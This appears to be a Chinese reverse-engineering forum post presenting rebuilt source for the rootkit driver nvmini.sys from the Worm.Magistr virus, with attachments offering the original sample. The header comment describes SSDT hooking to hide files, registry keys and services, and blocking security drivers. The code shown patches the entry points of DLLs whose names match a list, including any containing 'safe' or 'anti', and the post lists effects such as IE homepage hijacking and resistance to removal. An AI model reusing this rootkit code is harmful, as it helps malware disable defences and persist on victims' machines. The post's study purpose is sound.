
# 逆向病毒 `nvmini.sys`——编译通过——源码

> 原文：[`www.pediy.com/kssd/pediy10/60878.html`](https://www.pediy.com/kssd/pediy10/60878.html)

```c
/*Module : nvmini.c
 *
 * Author : sudami [sudami@163.com]
 * Time : 08/02/28
 *
 * Comment:
 * 去年月份强悍的“马吉斯（Worm.Magistr）”病毒浓妆艳抹的登场,MS 很强大。
 * 过去这么长时间了,初学逆向,俺作为后来者就试着分析了下它的 sys.于是就有了
 * 这份简陋的 code. 逆的很菜,老鸟飘过了=。=|
 *
 * 发现很多部分作者都是参考别人的 code,然后 A 过来用的.所以这里同样在一些方面
 * A 了 agony's some code. 嘿嘿
 *
 * ---- nvmini.sys 的大致流程如下----
 *
 * 1.> 通过替换 SDT 的中的函数地址挂钩 `ZwSaveKey`、`ZwQueryDirectoryFile`、`ZwClose`、
 * `ZwEnumerateKey`、`ZwLoadDriver`、`ZwDeleteValueKey`、`ZwDeleteKey` 来保护病毒的
 * 注册表键值不被发现和修改，隐藏病毒文件（`boot.exe`, `linkinfo.dll`, `nvmini.sys`）,
 * 隐藏服务以及禁止一些安全软件的驱动加载，eg: IS(俺为了试验,多加了几个)
 *
 * 2.> 和应用层通信-- 创建一个名为 `DL5CEvent` 的设备,用户进程可通过 `ioctl` = 25270860
 * 来获得最后一个创建进程的进程 ID(通过调用 `PsSetCreateProcessNotifyRoutine` 得到)
 * 此前用户层中已经通过 `OpenEvent` 打开了该对象，一直静静的等待着对象变成“受信”状态；
 * 而在驱动里，`ProcessCreateMon` 中一旦检测到新进程的创建就设置该对象为“受信”状态,
 * 于是用户层就高兴的发送 `ioctl` = 25270860 到驱动中，让 `buffer` 里面满载刚创建的进程 ID 号
 * 顺利的回到用户层。这样就/实现了 R3 中一个线程对新创建的进程的监视，一旦符合规则，
 * 就禁止创建，或 `kill` 掉. (俺没写 R3 的部分,所以就此略掉了,不过 R0 的代码中还保留)
 *
 * 3.> 通过 `PsSetLoadImageNotifyRoutine` 设置映像加载通知.禁止部分病毒 DLL 的加载,即
 * 修改物理内存修改模块入口是这些模块返回失败，无法成功加载.
 *
 * 4.> 1 个系统线程不断回写注册表的服务项.很暴力,不过 hook 一些更底层的操作注册表的函数
 * `ObXXXX` 之类的,就可以防止了; 注册一个 DPC 回调函数不断检查 SSDT,保护自己的 hook(由于俺
 * 在调试时,一用 `KeSetTimerEx` 就会蓝,和 IRQL 有关,所以换用系统线程来实现,功能类似,
 * ,保留 DPC 部分代码)
 *
 * 5.> 俺为了调试方便,加了一个修改 IE 首页,和 piaoxue 的驱动类型,就是暴力的回写注册表,很低级~~~
 *
 * btw: 病毒的作者好像是 hackbase 的 XXXXXXXXXX,很强悍的一个驱动大牛,MS 做病毒赚了不少银子.
 * 不过作者的主要精力可能不在驱动上,nvmini.sys 做的一般,没有用到太多的猥亵手法,比
 * 如检测进程等完全不需要和 R3 通讯,直接在驱动中用一个线程,加个回掉函数,然后投递 APC,
 * 杀线程即可,HOOOOK SSDT 等用烂的手段确实也太科普, 文件隐藏,注册表等都是很扫盲的手法,
 * 可能作者没考虑太多吧.
 *
 * ---- 后记----
 * 断断续续的逆 nvmini.sys 有一大会儿,可没有用 F5,深感没有 F5 的艰难~
 * 由于大 3 了,压力很大,专业的原因,也没多少业余时间来学内核,所以逆的很粗糙,不过功能都大致实现了.
 * 还忘各位大牛海涵,见笑啦~ o(*.*)0![](img/e71d9210a215d5b66755d038631e0c83.jpg "恐怖!")
 *
 * PS;
 * 为了防止被坏人 A 过去干坏事,已经把部分 code 做了相应的更改和删除, 不过有心学习的完全可以补起来~
 * 编译完的驱动无壳,也可直接 F5 看看效果~~~
 */
```

代码风格如下:

```c
//
//
VOID
MyLoadImageRoutine(
IN PUNICODE_STRING ImageName,
IN HANDLE ProcessId,
IN PIMAGE_INFO ImageInfo
)
/*++
逆向: sudami 08/03/05
功能:
在这个模块通知回调函数中进行过滤。若是病毒 DLL 加载,则修改其 DLL 的前字节
使其直接失效.
--*/
{
BOOL bFind;
ULONG Length;
WCHAR Name[300];
PEPROCESS proc;
PVOID pImageBase;
SIZE_T dwSize;
PVOID pOEP;
KIRQL oldIrql;
PIMAGE_DOS_HEADER dos;
PIMAGE_NT_HEADERS nth;
PIMAGE_OPTIONAL_HEADER poh;
PHYSICAL_ADDRESS physicalAddress;
if (ImageName == NULL) {
return;
}

Length = ImageName->Length;
if ((Length == 0) || (ImageName->Buffer == NULL)) {
return;
}

bFind = FALSE;
RtlCopyMemory(Name , ImageName->Buffer, ImageName->MaximumLength );
_wcsupr(Name);
//
// 原 IDB 中申明了一个结构体（全局变量），其中每个 DLL 名字后面紧跟着的是一个到的数字。
// 0 表明是在 SYSTEM32 目录下
// 1 表明是在 WINDOWS 目录下
// 2 表明是在 COMMON FILES 目录下
// 3 表明无论在哪都是病毒的 DLL
// 偶这里简化了一下，效果一样
// -- sudami 08/03/08
//
if ( ( (wcsstr( Name, L"DLLWM.DLL" ) != NULL) && (wcsstr( Name, L"SYSTEM32" ) != NULL) ) ||
( (wcsstr( Name, L"WININFO.RXK" ) != NULL) && (wcsstr( Name, L"COMMON FILES" ) != NULL) ) ||
( (wcsstr( Name, L"RICHDLL.DLL" ) != NULL) && (wcsstr( Name, L"WINDOWS" ) != NULL) ) ||
( (wcsstr( Name, L"RICHDLL.DLL" ) != NULL) && (wcsstr( Name, L"WINNT" ) != NULL) ) ||
(wcsstr( Name, L"WINDHCP.DLL" ) != NULL) ||
(wcsstr( Name, L"DLLHOSTS.DLL" ) != NULL) ||
(wcsstr( Name, L"NOTEPAD.DLL" ) != NULL) ||
(wcsstr( Name, L"RPCS.DLL" ) != NULL) ||
(wcsstr( Name, L"RDSHOST.DLL" ) != NULL) ||
(wcsstr( Name, L"LGSYM.DLL" ) != NULL) ||
(wcsstr( Name, L"RUND11.DLL" ) != NULL) ||
(wcsstr( Name, L"MDDDSCCRT.DLL" ) != NULL) ||
(wcsstr( Name, L"WSVBS.DLL" ) != NULL) ||
(wcsstr( Name, L"CMDBCS.DLL" ) != NULL) ||
(wcsstr( Name, L"UPXDHND.DLL" ) != NULL) ||
(wcsstr( Name, L"RDFHOST.DLL" ) != NULL) ||
(wcsstr( Name, L"safe" ) != NULL) ||
(wcsstr( Name, L"anti" ) != NULL) ) {
bFind = TRUE;
}

if ( bFind == FALSE ) {
return;
}

if( !NT_SUCCESS(PsLookupProcessByProcessId( ProcessId, &proc )) ) {
return;
}

KeAttachProcess (proc); // 附着到此进程
pImageBase = ImageInfo->ImageBase;
dwSize = ImageInfo->ImageSize;
try { // 确保地址的正确性
ProbeForRead( pImageBase, dwSize, sizeof(UCHAR));
} except(EXCEPTION_EXECUTE_HANDLER) {
return;
}

// 得到程序入口地址
dos = (PIMAGE_DOS_HEADER) pImageBase;
nth = (PIMAGE_NT_HEADERS) (dos->e_lfanew + (char *)pImageBase);
poh = (PIMAGE_OPTIONAL_HEADER) &nth->OptionalHeader;
if( (dos->e_magic != 0x5a4d) || (nth->Signature != 0x00004550) ) {// "MZ" "PE\0\0"
return;
}

pOEP = (PVOID)( poh->AddressOfEntryPoint + (char *)pImageBase );
physicalAddress = MmGetPhysicalAddress( pOEP );
ProbeForWrite ( pOEP, 5, sizeof(CHAR));

// 修改其前字节的内容,使其失效
WPOFF();
oldIrql = KeRaiseIrqlToDpcLevel();
RtlCopyMemory ( (BYTE*)pOEP, g_Code, 5 );
KeLowerIrql(oldIrql);
WPON();
KeDetachProcess();
}

-----------------------------------------------------------------
```

驱动加载后的效果：

**1. `IE` 首页被改写为 `http://hi.baidu.com/sudami`，`5ms` 回写一次.普通电脑用户无法修复**

**2. `SSDT` 被反复 `hook`，`5ms` 回写一次,隐藏了 `nvmini.sys` 和 `autorun.inf` 等文件**

**3. 反复回写驱动服务项, 普通用户无法更改和删除**

**4. 监视病毒模块的加载,禁止之, 监视进程的创建,可在 `dbgview` 中观察, 禁止 `IS`、`RKU`、`GMER`、`SnipeSword` 等驱动的加载**

本来还打算加个驱动文件占炕,和投递 `APC` 杀指定程序的线程的,想想这跟做病毒没什么区别的了,研究研究就可以了,![](img/1e00a4c5ba6d273521879fcbd5363999.jpg "碌眼")

因为病毒已经过去很长时间,用的技术都比较老,所以实际意义不大,就当扫盲了吧~![](img/792ac17acdd6fd3e39fc1aacdcf4c3d9.jpg "124.gif")

附件是 `code` 和 `nvmini.idb` 、和原版 `nvmini.sys`

上传的附件

\[由于是病毒，杀毒软件会查杀，故加上了密码保护，解压密码：`PEDIY`\]

| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) | | 逆向\_`nvmini.idb.rar` |
|---|---|---|
| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) | | 强悍病毒\_`nvmimi\_` 样本.rar |
| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) | | `nvmini\_` 公开版\_`sudami.rar` |

